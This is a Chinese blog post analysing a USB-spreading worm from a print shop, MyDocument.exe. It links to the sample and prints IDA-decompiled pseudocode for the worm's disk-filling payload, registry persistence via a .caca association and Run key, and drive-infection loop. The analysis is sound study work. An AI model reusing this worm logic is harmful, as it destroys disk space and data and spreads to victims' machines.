---
title: 打印店病毒分析 - MyDocument.exe
category: sec
---

# {{ page.title }}

样本仅供学习研究使用：

- [脱壳前]({{ site.url }}/resources/printer-virus/virus-1/mydocument.exe.en.b64)
- [脱壳后]({{ site.url }}/resources/printer-virus/virus-1/mydocument-unshell.exe.en.b64)

---

## 基本信息

运行明显特征：把U盘中正常文件隐藏放入 MyDocuments 文件夹中，该文件夹为隐藏+系统文件属性。同时产生一个MyDocument.exe，文件夹图标的病毒本体。用户不注意就会运行病毒。

VirSCAN.org在线测试：

脱壳前：

Scanner results:71%Scanner(s) (28/39)found malware  
File Name      : mydocument.exe  
File Size      : 28160 byte  
File Type      : application/x-dosexec  
MD5            : e4f4a55051884d42595a6be92e4f582f  
SHA1           : a4e8ea5b7180455eb0dd0f58fd59ef224a376827  
[Online report](http://r.virscan.org/report/7d3d08b86ffe374f1ab07ba81b1b80cb)  
PACKER : UPX 0.89.6 - 1.02 / 1.05 - 1.24 -> Markus & Laszlo  
Sub-file : upx_c_9400bb61dumpFile / 70ffdb68b8c7f260c794f0180c0683c8 / EXE

脱壳后：

Scanner results:41%Scanner(s) (16/39)found malware  
File Name      : virus.exe  
File Size      : 57344 byte  
File Type      : application/x-dosexec  
MD5            : ca4aac12de7f90e7f5788940ae616d92  
SHA1           : 6727479086fd2ffbd2572e6e650adfe04d80b286  
[Online report](http://r.virscan.org/report/f4342882fa7427c3031bfcc42867d411)

有点意思，脱壳后反而查出率降低了不少。

## 静态分析

IDA初步分析程序为Windows 32位程序，EP注明UPX，似乎有UPX加壳。  
使用PEID查壳，并从网上下载了脱壳机脱壳。（这里挖个坑，以后尝试手动脱这个壳）  
经脱壳，原28KB程序变为56KB。

main 函数如下：

{% highlight c %}
  sub_401150();
  GetCurrentDirectoryA(0x104u, &Buffer);
  wsprintfA(&RootPathName, aCCC, Buffer, v13, v14);
  v3 = GetDriveTypeA(&RootPathName);
  sub_40196A(aS, &Buffer);
  result = sub_40196A(aD, v3);
  if(v3 == 3) // DRIVE_FIXED
  {
    GetSystemDirectoryA(&FileName, 0x104u);
    wsprintfA(&Data, aCCCprogramFile, FileName, v7, v8);
    strcat(&Data, aSystem_caca);
    if(!sub_4012C0())
    {
      wsprintfA(&ExistingFileName, aSWinlogon_exe, &Buffer);
      sub_4011E0(&Data);
      CopyFileA(&ExistingFileName, NewFileName, 1);
    }
    sub_4012A0(&Data);
    sub_401580();
  }
  if(v3 == 2) // DRIVE_REMOVALVE
  {
    if(!sub_4012C0())
    {
      GetSystemDirectoryA(&Data, 0x104u);
      wsprintfA(&ExistingFileName, aSmydocument_ex, &RootPathName);
      wsprintfA(&FileName, aCCCprogramFile, Data, v10, v11);
      strcat(&FileName, aSystem_caca);
      sub_4012A0(&FileName);
      sub_4011E0(&FileName);
      CopyFileA(&ExistingFileName, NewFileName, 1);
      wsprintfA(&File, aSmydocument, &RootPathName);
      ShellExecuteA(0, Operation, &File, 0, 0, 1);
      sub_401580();
    }
    result = sub_4012C0();
    if(result)
    {
      wsprintfA(&File, aSmydocuments, &Buffer);
      result = (int)ShellExecuteA(0, Operation, &File, 0, 0, 1);
    }
  }
  return result;
{% endhighlight %}

下面具体分析流程。

首先执行`sub_401150`，判断当前日期是否在2011年4月1日到2011年5月2日之间，如果不是则什么也不做；如果是，则调用`sub_4010A0`，后重启计算机。`sub_4010A0`比较可恶，它从C到K尝试盘符，并调用`sub_401000`企图把每个存在的磁盘塞满（占用大约78GB空间）。

{% highlight c %}
int sub_401150()
{
  int result;
  struct _SYSTEMTIME SystemTime;

  *(_DWORD *)&SystemTime.wYear = 0;
  *(_DWORD *)&SystemTime.wDayOfWeek = 0;
  *(_DWORD *)&SystemTime.wHour = 0;
  *(_DWORD *)&SystemTime.wSecond = 0;
  GetLocalTime(&SystemTime);
  result = SystemTime.wDay + 100 * (SystemTime.wMonth + 100 * SystemTime.wYear);
  if ( result - 20110400 > 0 )
  {
    result -= 20110501;
    if ( result < 0 )
    {
      sub_4010A0();
      Sleep(0x36EE80u);
      result = system(aShutdownRT0F); // shutdown -r -t 0 -f
    }
  }
  return result;
}

UINT sub_4010A0()
{
  signed int v0; // ebp@1
  char v1; // bl@2
  UINT result; // eax@2
  int v3; // esi@3
  CHAR RootPathName; // [sp+10h] [bp-14h]@2
  int v5; // [sp+18h] [bp-Ch]@1
  int v6; // [sp+1Ch] [bp-8h]@1
  __int16 v7; // [sp+20h] [bp-4h]@1

  v5 = dword_409040;                            // 'cdef'
  v6 = dword_409044;                            // 'ghij'
  v7 = word_409048;                             // 'k'
  v0 = 0;
  do
  {
    v1 = *((_BYTE *)&v5 + v0);
    wsprintfA(&RootPathName, aC_0, *((_BYTE *)&v5 + v0));
    strcat(&RootPathName, asc_409038);
    result = GetDriveTypeA(&RootPathName);
    if ( result == 3 ) // fixed disc
    {
      v3 = 1;
      do
        result = sub_401000(v1, v3++);
      while ( v3 < 400 ); // create 400 * 200MB files on a fixed disc
    }
    ++v0;
  }
  while ( v0 < 9 );
  return result;
}

signed int __cdecl sub_401000(char a1, int a2)
{
  HANDLE v2; // eax@1
  void *v3; // esi@1
  signed int result; // eax@2
  CHAR FileName; // [sp+8h] [bp-104h]@1

  memset(&FileName, 0, 0x104u);
  wsprintfA(&FileName, aCD, a1, a2);
  v2 = CreateFileA(&FileName, 0x10000000u, 0, 0, 1u, 6u, 0);
  v3 = v2;
  if ( v2 == (HANDLE)-1 )
  {
    result = 0;
  }
  else
  {
    SetFilePointer(v2, 209715200, 0, 0); // 200MB
    SetEndOfFile(v3); // change the file size to 200MB
    CloseHandle(v3);
    result = 1;
  }
  return result;
}
{% endhighlight %}

之后，病毒获取自身所在盘符，判断是本地磁盘(DRIVE_FIXED)还是可移动磁盘(DRIVE_REMOVALVE)。

接着执行了`sub_40196A`。我尚未明白这个函数的功能是什么。留坑。

基于之前的结果，main函数分两个逻辑流：

①如果病毒当前处于本地磁盘：

获取系统盘盘符，构成一个文件名字符串`C:\Program Files\system.caca`。

调用`sub_4012C0`判断`C:\Program Files\Internet Explorer\WINLOGON.exe`是否存在，如果不存在则调用`sub_4011E0`向注册表中写入三个项，并把它自己复制到`C:\Program Files\Internet Explorer`下，改名为`WINLOGON.exe`。

`sub_4011E0`具体向注册表中写入的三项为：

|KEY|SUBKEY|VALUE|
|:-:|:-:|:-:|
|HKEY_CLASSES_ROOT|.caca|cacafile|
|HKEY_CLASSES_ROOT|cacafile\shell\open\command|C:\Program Files\Internet Explorer\WINLOGON.exe|
|HKEY_LOCAL_MACHINE|software\Microsoft\Windows\CurrentVersion\Run|C:\Program Files\system.caca|

```
第一项
把`.caca`扩展名和`cacafile`文件类型关联起来。

第二项
对于所有`cacafile`文件，执行`C:\Program Files\Internet Explorer\WINLOGON.exe`。

第三项
设置`C:\Program Files\system.caca`开机启动。
```

调用`sub_4012A0`创建`C:\Program Files\system.caca`。


调用`sub_401580`，进入死循环，持续监视可移动磁盘，一旦发现就感染该磁盘。具体的行为是：

在循环体中调用`sub_4012E0`从D到K寻找可能是可移动磁盘盘符的字母，找到则返回该盘符，否则返回110（从反编译的代码看来，`sub_4012E0`的有缺陷，它每次都是从D开始判断，假如说我的电脑上插了两个U盘分别是H和I，那么它每次都只会找到H，而不会感染I）；

如果找到了可移动磁盘，则再次调用`sub_4012E0`获得盘符（重复调用这个函数，有些奇怪，我觉得直接用之前返回的结果就可以）；

接着调用`sub_4013A0`来感染找到的可移动磁盘（传播往往是代码最精彩的部分）：在可移动磁盘根目录下创建`MyDocuments`目录并设置为隐藏和系统文件夹属性；把`C:\Program Files\Internet Explorer\WINLOGON.exe`复制到可移动磁盘根目录并改名为`MyDocument.exe`（这一点说明之前病毒是把自己复制到了C盘下的那个`WINLOGON.exe`）；接着搜索可移动磁盘根目录下所有文件，把除了自己之外的所有文件都移动到`MyDocuments`下（其实不严谨，病毒没有匹配自己的文件名，而是把所有'.'开头的、第二个字母是'y'的、第十个字母是't'的排除在外）。

从`sub_4013A0`出来后，再次把`C:\Program Files\Internet Explorer\WINLOGON.exe`复制到可移动磁盘根目录并改名为`MyDocument.exe`，是为了保险？

又回到`sub_401580`的循环开始处。

{% highlight c %}

LSTATUS __cdecl sub_4011E0(LPCSTR lpData)
{
  HKEY phkResult; // [sp+10h] [bp-4h]@1

  RegCreateKeyA(HKEY_CLASSES_ROOT, SubKey, &phkResult); // .caca
  RegSetValueA(phkResult, 0, 1u, Data, strlen(Data)); // cacafile
  RegCloseKey(phkResult);
  RegCreateKeyA(HKEY_CLASSES_ROOT, aCacafileShellO, &phkResult); // cacafile\shell\open\command
  RegSetValueA(phkResult, 0, 1u, NewFileName, strlen(NewFileName)); // C:\Program Files\Internet Explorer\WINLOGON.exe
  RegCloseKey(phkResult);
  RegCreateKeyA(HKEY_LOCAL_MACHINE, aSoftwareMicros, &phkResult);// software\Microsoft\Windows\CurrentVersion\Run
  RegSetValueA(phkResult, 0, 1u, lpData, strlen(lpData)); // C:\Program Files\system.caca
  return RegCloseKey(phkResult);
}

void __noreturn sub_401580()
{
  int v0; // esi@2
  CHAR NewFileName; // [sp+10h] [bp-104h]@2
  while ( 1 ) // forever
  {
    if ( sub_4012E0() / 110 )
    {
      Sleep(0x64u);
    }
    else
    {
      v0 = sub_4012E0();
      sub_4013A0(v0);
      wsprintfA(&NewFileName, aCMydocument_ex, v0);
      CopyFileA(::NewFileName, &NewFileName, 1);
    }
  }
}

signed int sub_4012E0()
{
  int v0; // ebx@1
  CHAR RootPathName; // [sp+10h] [bp-14h]@2
  int v3; // [sp+18h] [bp-Ch]@1
  int v4; // [sp+1Ch] [bp-8h]@1
  char v5; // [sp+20h] [bp-4h]@1

  v3 = dword_4090F0;                            // 'gfed'
  v4 = dword_4090F4;                            // 'kjih'
  v5 = byte_4090F8;                             // 0
  v0 = 0;
  while ( 1 )
  {
    wsprintfA(&RootPathName, aC_0, *((_BYTE *)&v3 + v0));
    strcat(&RootPathName, asc_409038);
    if ( GetDriveTypeA(&RootPathName) == 2 ) // removable disc
      return *((_BYTE *)&v3 + v0);
    if ( v0 == 8 ) // no removable disc, break
      break;
    Sleep(0x64u);
    if ( ++v0 >= 9 )
      return 0;
  }
  return 110;
}

HANDLE __cdecl sub_4013A0(int a1)
{
  HANDLE result; // eax@4
  HANDLE v2; // edi@4
  CHAR *v3; // [sp-8h] [bp-770h]@2
  CHAR PathName; // [sp+10h] [bp-758h]@1
  struct _WIN32_FIND_DATAA FindFileData; // [sp+114h] [bp-654h]@4
  char v6; // [sp+254h] [bp-514h]@1
  CHAR NewFileName; // [sp+358h] [bp-410h]@2
  CHAR FileName; // [sp+45Ch] [bp-30Ch]@4
  CHAR ExistingFileName; // [sp+560h] [bp-208h]@8
  CHAR v10; // [sp+664h] [bp-104h]@8

  wsprintfA(&PathName, aC, a1);
  strcpy(&v6, &PathName);
  strcat(&PathName, aMydocuments);
  if ( _access(&PathName, 0) ) // MyDocuments not exist
  {
    wsprintfA(&NewFileName, aSMydocument_ex, &v6);
    CreateDirectoryA(&PathName, 0); // create MyDocuments directory in h
    SetFileAttributesA(&PathName, 6u); // set MyDocuments attribute: hide | system file
    v3 = &NewFileName; // v3 = h:\\MyDocument.exe
  }
  else // exist
  {
    SetFileAttributesA(&PathName, 6u);
    wsprintfA(&NewFileName, aSMydocument_ex, &v6);
    v3 = &NewFileName;
  }
  CopyFileA(::NewFileName, v3, 1);
  wsprintfA(&FileName, aS_, &v6); // filename = h:\\*.*
  result = FindFirstFileA(&FileName, &FindFileData);
  v2 = result;
  if ( result != (HANDLE)-1 ) // find successfully
  {
    do
    {
      if ( FindFileData.cFileName[0] != '.' && (FindFileData.cFileName[1] != 'y' || FindFileData.cFileName[9] != 't') )
      {
        wsprintfA(&ExistingFileName, aSS, &v6, FindFileData.cFileName);
        wsprintfA(&v10, aSS, &PathName, FindFileData.cFileName);
        MoveFileExA(&ExistingFileName, &v10, 1u);
      }
    }
    while ( FindNextFileA(v2, &FindFileData) );
    result = (HANDLE)FindClose(v2);
  }
  return result;
}
{% endhighlight %}

②如果病毒当前处于可移动磁盘：

先执行`sub_4012C0`判断`C:\Program Files\Internet Explorer\WINLOGON.exe`是否存在：

如果不存在则调用`sub_4012A0`创建`C:\Program Files\system.caca`，再调用`sub_4011E0`向注册表中写入三个项，接着把它自己（准确地说，是可移动磁盘下的MyDocument.exe文件）复制到`C:\Program Files\Internet Explorer`下并改名为`winlogon.exe`。

接着，调用`ShellExecute`执行展示（`explore`）当前可移动磁盘下`MyDocument`目录的命令（迷惑用户以为自己正常打开了文件夹，其实系统已经被感染）。

然后同上面一样，调用`sub_401580`，进入死循环，持续监视可移动磁盘，一旦发现就感染该磁盘。由于这个函数有一些问题（前面分析过，每次只能感染同一个可移动磁盘），所以当前可移动磁盘拔掉之前有可能无法感染其他可移动磁盘了（除非那个磁盘的盘符字母序在当前这个的前面）。

注意，刚刚判断`C:\Program Files\Internet Explorer\WINLOGON.exe`是否存在时如果不存在最后是直接进入监控死循环的；如果存在，则跳过上面那些，它又调用`sub_4012C0`来判断`C:\Program Files\Internet Explorer\WINLOGON.exe`是否存在，这次如果存在，则说明当前系统已被感染（至少病毒这么想），它仅仅打开`MyDocument`目录，把正常文件展示给用户；如果这次不存在，则什么也不做，退出程序（这里重复判断体现了病毒的狡猾：如果因为某种原因，上次判断之后C盘下的病毒复制品被删除了，病毒将不给用户展示正常文件夹，用户以为出错，一般来说会再次双击运行这个病毒，于是又会走一次流程......）。

## 总结

根据时间来看，很可能是11年愚人节前夕推出的病毒。

不知是有意放到学校打印店还是被某个宿主带过去，总之到了打印店之后传播效果明显增强，后来在很多教室的电脑中也看到了这个病毒（有一次从投影上看着老师打开U盘拷出课件来上课，然后一台无辜的电脑被感染了，然后下课同学们去那台电脑上拷贝课件......）。

还好不是木马，只是具有破坏性和传播性。

作者做了简单的加壳，说明有一些反逆向的意识。如果是用C或者C++等语言写出来的，那么对WindowsAPI也确实熟悉。使用文件夹图标做掩护，的确骗过了很多用户，但是系统也确实显示这是一个应用程序，不过很多人可能看到文件夹图标就一切OK了。就Windows上的病毒来说，还有改后缀，或者把恶意代码捆绑以宏的形式捆绑到文档里等等。总之就是掩人耳目。

添加注册表那个地方我觉得挺厉害的。它没有直接把可执行文件添加到启动项里，而是放置了一个`.caca`的跳板。这个跳板是一个空文件，但是文件内容不重要，它通过扩展名来把跳板和病毒本体（`WINLOGON.exe`）关联起来了。这三个注册表添加蛮有趣（虽然在我的机子上添加注册表失败了，可能是杀毒软件的原因）。

另外关于每次只能感染同一个可移动磁盘这一点，我又思考了一下，也许自有道理——还是为了避免用户生疑。

现在的杀软当然直接就把它干掉了，但是11年那会儿，谁知道呢？
